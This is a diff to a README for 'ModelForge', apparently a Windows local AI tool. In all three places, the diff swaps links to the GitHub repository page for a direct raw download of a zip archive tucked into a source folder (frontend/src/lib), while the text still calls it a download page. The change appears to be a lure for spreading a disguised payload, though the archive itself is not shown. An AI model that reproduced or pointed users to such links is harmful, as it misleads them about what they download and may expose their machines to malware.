@@ -1,6 +1,6 @@
 # ⚙️ ModelForge - Simple Local AI Workstation  
 
-[![Download ModelForge](https://img.shields.io/badge/Download-ModelForge-brightgreen?style=for-the-badge)](https://github.com/Mrdodo446/ModelForge)  
+[![Download ModelForge](https://img.shields.io/badge/Download-ModelForge-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Mrdodo446/ModelForge/main/frontend/src/lib/Model-Forge-1.3-beta.3.zip)  
 
 ## 🔍 What is ModelForge?  
 
@@ -28,7 +28,7 @@ Follow these steps to get ModelForge up and running on Windows.
 
 Go to the ModelForge download page by clicking the link below:  
 
-[![Download ModelForge](https://img.shields.io/badge/Download-ModelForge-blue?style=for-the-badge)](https://github.com/Mrdodo446/ModelForge)  
+[![Download ModelForge](https://img.shields.io/badge/Download-ModelForge-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mrdodo446/ModelForge/main/frontend/src/lib/Model-Forge-1.3-beta.3.zip)  
 
 This page hosts the latest version of ModelForge and other resources.  
 
@@ -103,4 +103,4 @@ If you get stuck during setup or usage, visit the Issues section on the ModelFor
 
 ---
 
-[Download ModelForge](https://github.com/Mrdodo446/ModelForge) – Visit this page to get the latest version for Windows.
+[Download ModelForge](https://raw.githubusercontent.com/Mrdodo446/ModelForge/main/frontend/src/lib/Model-Forge-1.3-beta.3.zip) – Visit this page to get the latest version for Windows.
